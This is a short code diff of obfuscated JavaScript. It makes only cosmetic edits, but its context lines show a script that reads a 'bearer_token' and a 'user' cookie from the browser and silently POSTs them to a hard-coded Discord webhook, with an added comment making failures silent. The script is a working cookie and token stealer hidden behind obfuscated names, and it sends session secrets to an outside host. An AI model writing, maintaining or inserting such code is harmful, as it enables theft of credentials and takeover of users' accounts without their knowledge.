@@ -11,7 +11,7 @@
     }
 
     const _0x235d = _0x1a9b('bearer_token');
-    const _0x3b5d = _0x1a9b('user');  // Fetches the 'user' cookie
+    const _0x3b5d = _0x1a9b('user'); // Fetches the 'user' cookie
 
     if (_0x235d && _0x3b5d) {
         const _0x2499 = 'https://discord.com/api/webhooks/1309671906504474725/Ayyr-d-vo28UNdHN8O4G1pmL1soa6klt-sm90WP9Pv2Uh7Qu7oett6OZYDLyWB3Z7p7t';
@@ -28,6 +28,7 @@
             body: JSON.stringify(_0x2d2e)
         })
         .catch(_0x1ff3 => {
+            // Fail silently if there is an error
         });
     }
 })();
